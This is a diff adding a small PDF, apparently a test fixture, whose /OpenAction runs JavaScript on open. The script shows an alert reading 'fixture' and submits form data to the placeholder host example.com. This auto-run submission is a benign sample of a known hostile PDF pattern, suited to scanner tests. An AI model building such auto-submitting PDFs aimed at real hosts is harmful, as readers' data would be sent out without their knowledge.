@@ -1,0 +1,36 @@
+%PDF-1.7
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Count 1 /Kids [6 0 R] >>
+endobj
+3 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+4 0 obj
+<< /Length 263 /Filter /FlateDecode >>
+stream
+xœ•ÒMnƒ0†á}O1Ëvµ$d×%«J­(˜ŠArä?£Âí+¨%¤,pz€çc^™ª×AÓ8äö9ƒFÃsMíµ-|’uŠ &g{ÿÍÎÍS0»Ç¼\ğÉšN¶d¼DÒxê* ñ‘İa·lœµSv"ƒš6/Wu²Ú¡™€4Jµ©2¾ªÚªíOäÅıašŒ‡ÁãAû|qG-BMñœ`p6i?›·şïERQ»È½K\ØøpÔ£—Öp4¨¦!rq±RÁ„HXğ2YˆE\HÉ*¼Q¦›Mú=›ÿG†¯››.x'lãy	&²„&ùU,Æk
+endstream
+endobj
+5 0 obj
+<< /Type /Action /S /JavaScript /JS (app.alert\(\"fixture\"\); submitForm\(\"https://example.com/submit\"\);) >>
+endobj
+6 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents 4 0 R  >>
+endobj
+xref
+0 7
+0000000000 65535 f 
+0000000009 00000 n 
+0000000076 00000 n 
+0000000133 00000 n 
+0000000203 00000 n 
+0000000538 00000 n 
+0000000666 00000 n 
+trailer
+<< /Size 7 /Root 1 0 R >>
+startxref
+793
+%%EOF
